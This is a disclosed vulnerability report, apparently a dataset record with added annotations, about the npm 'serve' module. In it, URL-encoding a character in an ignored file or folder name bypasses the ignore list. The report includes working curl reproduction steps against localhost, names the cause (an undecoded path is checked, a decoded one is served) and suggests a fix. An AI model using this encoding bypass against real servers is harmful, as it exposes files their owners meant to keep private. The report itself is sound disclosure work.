{
  "reported_to": "Node.js third-party modules",
  "reported_by": "0xchr00t ",
  "title": "[serve] Directory listing and File access even when they have been set to be ignored.",
  "content": "\nModule:\nName: serve\nVersion: latest (6.4.9)\nLink: https://www.npmjs.com/package/serve\nDescription:\nThe serve modules allows directory browsing and to serve static files through the browser.\nThe config option ignore can be used to tell the module which file or directory are forbidden and should not be served.\nThis rule can be bypassed by url encoding the name of the file or directory that has been forbidden.\nReproduction Steps:\nInstall serve\nCreate an application that uses serve for file serving listing and set a few folders and files in the ignore config.\nCode 120 Bytes\n1const serve = require('serve')\n2const server = serve(__dirname, {\n3\t  port: 1337,\n4\t  ignore: ['testfolder', 'test.txt']\n5})\nRun the app\nCode 18 Bytes\n1$ node filename.js\nNow, current directory will be served by serve with the exception of folder testfolder and file test.txt\nIf we try to curl test.txt we get a Not Found error\nCode 47 Bytes\n1$ curl http://localhost:1337/test.txt\n2Not Found\nThe url encoded value for e is %65. So after replacing an e with its url encoded form, we are able to access the file.\nCode 67 Bytes\n1$ curl http://localhost:1337/t%65st.txt\n2this is a forbidden file :D\nAdditionally, curling the directory testfolder returns a 404 too.\nCode 50 Bytes\n1$ curl http://localhost:1337/testfolder/\n2Not Found\nApplying the same strategy as above, we are able to get a listing of all the files and folders inside the restricted directory.\nCode 422 Bytes\n1$ curl http://localhost:1337/t%65stfolder/\n2<!DOCTYPE html>\n3<html lang=\"en\">\n4  <head>\n5    <meta charset=\"utf-8\">\n6    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1\">\n7    <title>Files within testserve/testfolder/</title>\n8      .\n9      .\n10          <li>\n11            <a href=\"/testfolder/testfile.txt\" title=\"testfile.txt\" class=\"txt\">testfile.txt</a>\n12            <i>31 B</i>\n13          </li>\n14      .\n15      .\nAnd then we can further access the files inside the forbidden folder using same strategy.\nCode 85 Bytes\n1$ curl http://localhost:1337/t%65stfolder/testfile.txt\n2this is a test ... forbidden !\nMitigation Strategy\nFrom what I could gather, this is happening because the path variable that is being checked against the user created forbidden folders blacklist, is essentially different from the one which is being used to serve the file/folder.\nNote these particular lines in file /lib/server.js-\nCode 94 Bytes\n190  const ignored = !ignoredFiles.every(item => {\n291    return !pathname.includes(item)\n392  })\nLine 91 handles the logic for checking if one of the ignored folder/file names is present in the current requested path. Note that here, the variable pathname is used. This variable is not url decoded, while the variable which is used to actually serve the file is named related and is url decoded by passing requested path through decodeURIComponent function.\nSo one strategy would be to use the related variable for checking against the blacklist too.\nImpact\nThe issue essentially bypasses the ignore files/folders feature and allows an attacker to read from a directory/file that the victim has not allowed access to.\n\n",
  "severity": [
    9.3,
    null
  ],
  "bounty": null,
  "weaknesses": [
    "Information Exposure Through Directory Listing"
  ],
  "screenshots": {},
  "disclosed_date": 1520938380,
  "report_url": "https://hackerone.com/reports/308721",
  "is_multi_component": true,
  "complexity": "HIGH",
  "novelty": "MEDIUM",
  "vuln_category": "CODE",
  "steps": [
    [
      1,
      "Install the 'serve' module and set up a server with specific files/folders to ignore"
    ],
    [
      2,
      "Access the ignored files/folders by URL encoding characters in their names"
    ]
  ],
  "vuln_description": "The 'serve' module fails to properly enforce ignored files/folders when their names are URL encoded, allowing unauthorized access to restricted content.",
  "reason": "The vulnerability involves understanding URL encoding and how the module processes paths differently for access checks versus actual file serving, but the attack itself is straightforward once this discrepancy is identified.",
  "new_complexity": "MEDIUM",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": null
}